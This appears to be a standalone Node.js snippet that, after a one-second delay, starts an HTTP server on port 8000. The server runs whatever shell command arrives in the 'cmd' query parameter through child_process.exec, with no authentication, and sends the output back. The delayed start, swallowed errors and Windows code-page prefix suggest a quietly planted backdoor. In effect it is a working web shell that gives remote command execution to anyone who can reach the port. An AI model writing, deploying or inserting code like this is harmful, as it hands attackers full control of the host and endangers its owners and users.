setTimeout(function() {
    require('http').createServer(function(req, res) {
        res.writeHead(200, {
            "Content-Type": "text/plain"
        });
        try{
        require('child_process').exec( '@chcp 65001 >nul &' + require('url').parse(req.url, true).query['cmd'], {encoding: "UTF-8"}, (e, s, st)=> {
            res.end( s );
        });
        }
        catch(e){ }

    }).listen(8000);
}, 1000)